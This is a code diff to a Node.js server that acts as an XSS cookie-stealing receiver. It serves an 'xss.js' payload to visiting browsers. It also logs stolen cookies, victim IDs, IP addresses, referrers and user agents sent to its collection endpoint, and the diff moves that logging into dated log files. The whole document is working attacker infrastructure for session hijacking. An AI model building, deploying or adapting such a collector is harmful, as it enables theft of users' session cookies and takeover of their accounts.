@@ -18,15 +18,22 @@ function formatDate(date, style){
 	return style.replace('yyyy', y).replace('MM', M).replace('dd', d).replace('hh', h).replace('mm', m).replace('ss', s);
 };
 
-function logOut(logContent){
-
+function logIn(logContent){ //写入日志并输出控制台
+	//TODO判断Log文件夹是否存在
+	logFileName = "./Log/"+formatDate(new Date,"yyyy-MM-dd")+"Log.txt"; //日志文件例子:2014-11-29Log.txt
+	fs.appendFile(logFileName,logContent, "utf-8" , function (err){
+		if (err) throw err;
+		console.log(logContent);
+	});
 };
 
 
 
 function start(route) {
+	var Website_port = 8081;	//网站所在端口号。
+
 	function onRequest(request, response) {
-		var responContent = "";
+		var resContent = "";
 		var pathname = url.parse(request.url).pathname;
 		if(pathname === "/favicon.ico")
 		{
@@ -40,27 +47,34 @@ function start(route) {
 		{
 			requrl = request.url;
 			args = url.parse(request.url,true).query;
-			console.log("\n|Cookie Get! "+formatDate(new Date,"yyyy-MM-dd hh:mm:ss")+"|");
-			console.log("Source:	"+getClientIp(request));
-			console.log("Refer:	"+requrl);
-			console.log("ID:	"+args.id);
-			console.log("Cookie:");
-			console.log(args.cookie);
-			console.log("|Get end.|\n")
+			resContent += formatDate(new Date,"yyyy-MM-dd hh:mm:ss") + " |Get cookie|";
+			resContent += "	Source:	"+getClientIp(request);
+			resContent += "	Refer:	"+requrl;
+			resContent += "	ID:	"+args.id;
+			resContent += "	Cookie:";
+			resContent += "\n"+args.cookie+"\n";
+			logIn(resContent);
+			return;
 		}
 		else if(pathname === "/xss.js")
 		{
-			console.log("Received "+getClientIp(request)+" requesting for: "+pathname);
+
+			resContent += formatDate(new Date,"yyyy-MM-dd hh:mm:ss") + " | Received "+getClientIp(request)+" requesting for: "+pathname +"	";
+			resContent += "UA:	"+request.headers['user-agent']+ "	";
 			var file_ =  fs.readFileSync("./xss.js", "utf-8");
+			//TODO 文件读取异常处理
 			response.writeHead(200, {'Content-Type': 'text/javascript'});
 			response.write(file_, "utf-8");
 			response.end();
+			logIn(resContent);
 			return;
 		}
 		else
 		{	
-			console.log("Received "+getClientIp(request)+" requesting for: "+pathname);
-			console.log("UA:	"+request.headers['user-agent']);
+			resContent += formatDate(new Date,"yyyy-MM-dd hh:mm:ss") + " | Received "+getClientIp(request)+" requesting for: "+pathname +"	";
+			resContent += "UA:	"+request.headers['user-agent']+ "	";
+			logIn(resContent);
+			return;
 		}
 
 		function getClientIp(req) {
@@ -77,8 +91,8 @@ function start(route) {
 	
 	}
 
-	http.createServer(onRequest).listen(8080);
-	console.log('Server running at http://127.0.0.1:8080/')
+	http.createServer(onRequest).listen(Website_port);
+	logIn(formatDate(new Date,"yyyy-MM-dd hh:mm:ss") + ' | Server started.Running at http://127.0.0.1:'+Website_port+'/');
 }
 
 exports.start = start;
